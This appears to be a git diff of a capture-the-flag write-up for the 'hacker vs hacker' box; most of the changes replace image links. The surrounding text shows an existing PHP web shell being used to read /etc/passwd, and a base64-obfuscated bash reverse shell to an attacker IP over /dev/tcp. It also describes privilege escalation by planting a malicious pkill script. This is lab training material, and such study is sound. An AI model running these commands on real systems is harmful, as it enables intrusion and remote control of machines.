@@ -16,15 +16,16 @@ PORT   STATE SERVICE
 
 visiting the web server shows the website has a file upload functionality 
 
-![file_upload.png](hacker%20vs%20hacker%205c0c2a25e131417ea6b0ce352f442647/file_upload.png)
+![file_upload](https://user-images.githubusercontent.com/71389295/185770220-befd6c9f-27c4-4783-a1bc-42cc8ef3fd85.png)![root](https://user-images.githubusercontent.com/71389295/185770231-52ae023a-8685-4276-be61-9ae541b80af2.png)
+
 
 it was giving the following result whenever I tried to upload a file
 
-![hacked.png](hacker%20vs%20hacker%205c0c2a25e131417ea6b0ce352f442647/hacked.png)
+![hacked](https://user-images.githubusercontent.com/71389295/185770223-8ed83266-43a5-4f65-b157-bbefd767817f.png)
 
 examining the upload requests shows some commented php source code in the server response
 
-![server_response.png](hacker%20vs%20hacker%205c0c2a25e131417ea6b0ce352f442647/server_response.png)
+![server_response](https://user-images.githubusercontent.com/71389295/185770241-f400586c-6d2d-4dd7-b910-81ab77a8006e.png)
 
 ```php
 -->Hacked! If you dont want me to upload my shell, do better at filtering!
@@ -51,23 +52,21 @@ this is a basic vulnerable file upload code in PHP, where the programmer only ch
 
 I took a loot at `cvs/` but the listing was disabled
 
-![listing_disabled.png](hacker%20vs%20hacker%205c0c2a25e131417ea6b0ce352f442647/listing_disabled.png)
+![listing_disabled](https://user-images.githubusercontent.com/71389295/185770224-7f21642a-c85d-4baf-b8b6-ab2a3ff75794.png)
 
 at first I thought this is actual code for `upload.php` so I tried uploading some shell with the name `shellcode.pdf.php`, but after getting the same response from the server when trying to upload different files, I figured that the attacker uploaded his shell on the server and removed the upload functionality, the idea of this box is to think like a hacker who already made his was inside, so I checked for the presence of `nope.thm/cvs/shell.pdf.php` and …
-
  
-
-![boom.png](hacker%20vs%20hacker%205c0c2a25e131417ea6b0ce352f442647/boom.png)
+![boom](https://user-images.githubusercontent.com/71389295/185770218-0fcd7549-9e80-40ca-a6d1-b6fb07b6c877.png)
 
 then I tried to give it an argument via `cmd` parameter and it worked as well!
 
 [`http://nope.thm/cvs/shell.pdf.php?cmd=ls`](http://nope.thm/cvs/shell.pdf.php?cmd=ls)
 
-![cmd.png](hacker%20vs%20hacker%205c0c2a25e131417ea6b0ce352f442647/cmd.png)
+![cmd](https://user-images.githubusercontent.com/71389295/185770219-ee2fc1c4-2483-4e07-b284-5786d403e536.png)
 
 next thing I did was getting the list of users on the system [`http://nope.thm/cvs/shell.pdf.php?cmd=cat+/etc/passwd`](http://nope.thm/cvs/shell.pdf.php?cmd=cat+/etc/passwd), getting the user flag from `/home/lachlan/user.txt` ([`http://nope.thm/cvs/shell.pdf.php?cmd=cat+/home/lachlan/user.txt`](http://nope.thm/cvs/shell.pdf.php?cmd=cat+/home/lachlan/user.txt)) then getting a reverse shell with [`http://nope.thm/cvs/shell.pdf.php?cmd=echo+L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuOC4xNDQuMTQ5LzEwMDAwIDA8JjEgMj4mMQo=|base64+-d|bash`](http://nope.thm/cvs/shell.pdf.php?cmd=echo+L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuOC4xNDQuMTQ5LzEwMDAwIDA8JjEgMj4mMQo=%7Cbase64+-d%7Cbash)
 
-![reverse_connection.png](hacker%20vs%20hacker%205c0c2a25e131417ea6b0ce352f442647/reverse_connection.png)
+![reverse_connection](https://user-images.githubusercontent.com/71389295/185770226-f3cf592a-8542-4138-807f-cace491d3418.png)
 
 there was an annoying bit about this box, which is that you couldn’t spawn a pty duo to a crontab killing all `pts`s so the moment you hit `ctrl-c` by mistake you loose your shell
 
@@ -155,4 +154,4 @@ two things to note here
     
     so dropping a malicious `pkill` script under `/home/lachlan/bin` should get us `root` privileges
     
-    ![root.png](hacker%20vs%20hacker%205c0c2a25e131417ea6b0ce352f442647/root.png)
+![root](https://user-images.githubusercontent.com/71389295/185770284-bdad7916-eb5d-449f-96eb-269a27db8cea.png)
